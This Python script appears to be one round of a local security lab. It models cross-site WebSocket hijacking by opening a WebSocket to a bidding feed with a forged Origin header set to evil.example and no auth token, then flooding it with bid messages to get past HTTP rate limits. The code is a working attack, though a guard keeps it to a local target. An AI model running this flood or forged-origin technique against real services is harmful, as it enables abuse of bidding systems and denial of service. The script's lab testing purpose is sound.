"""Round 4 attack — WebSocket flood from a cross-site origin.

Open one WebSocket to the live-drop feed and send bid messages as fast as
possible. Over a single connection this is invisible to any HTTP rate limiter.
The connection also carries a forged ``Origin`` of another site and no auth
token, modelling cross-site WebSocket hijacking (CSWSH): a browser on a page the
victim visits would open exactly this socket.

At DEFENSE_LEVEL<4 every message is accepted — the flood lands. At
DEFENSE_LEVEL=4 the handshake is refused on Origin, or (if you allow anonymous
read) the per-connection bucket throttles and then closes the connection, and
unauthenticated bids are rejected.
"""

from __future__ import annotations

import json
import time

from websockets.sync.client import connect

from _common import BASE_URL, DATACENTER_IP, require_local_target, ws_url

ACTOR = "bot-r4"


def run(base: str = BASE_URL, n: int = 200) -> dict:
    require_local_target(base)
    extra = {"Origin": "http://evil.example", "X-Lab-Actor": ACTOR,
             "X-Lab-Egress": DATACENTER_IP, "User-Agent": "python-websockets/attack"}
    sent = accepted = errors = 0
    connected = False
    t0 = time.perf_counter()
    try:
        with connect(ws_url(), additional_headers=extra, open_timeout=5) as ws:
            connected = True
            for i in range(n):
                try:
                    ws.send(json.dumps({"action": "bid", "item_id": 42, "amount": 1.0}))
                    sent += 1
                    reply = json.loads(ws.recv(timeout=5))
                    if reply.get("event") == "bid_ack":
                        accepted += 1
                    else:
                        errors += 1
                except Exception:
                    errors += 1
                    break
    except Exception:
        connected = False
    elapsed = time.perf_counter() - t0
    rate = round(accepted / elapsed, 1) if elapsed else 0.0
    return {"actor": ACTOR, "connected": connected, "sent": sent, "accepted": accepted,
            "rejected": errors, "elapsed_s": round(elapsed, 2), "accepted_per_s": rate}


if __name__ == "__main__":
    s = run()
    if not s["connected"]:
        print("[round4] handshake refused (origin/auth) — flood never started")
    else:
        print(f"[round4] connected; {s['accepted']}/{s['sent']} bids accepted "
              f"({s['accepted_per_s']}/s), {s['rejected']} rejected")
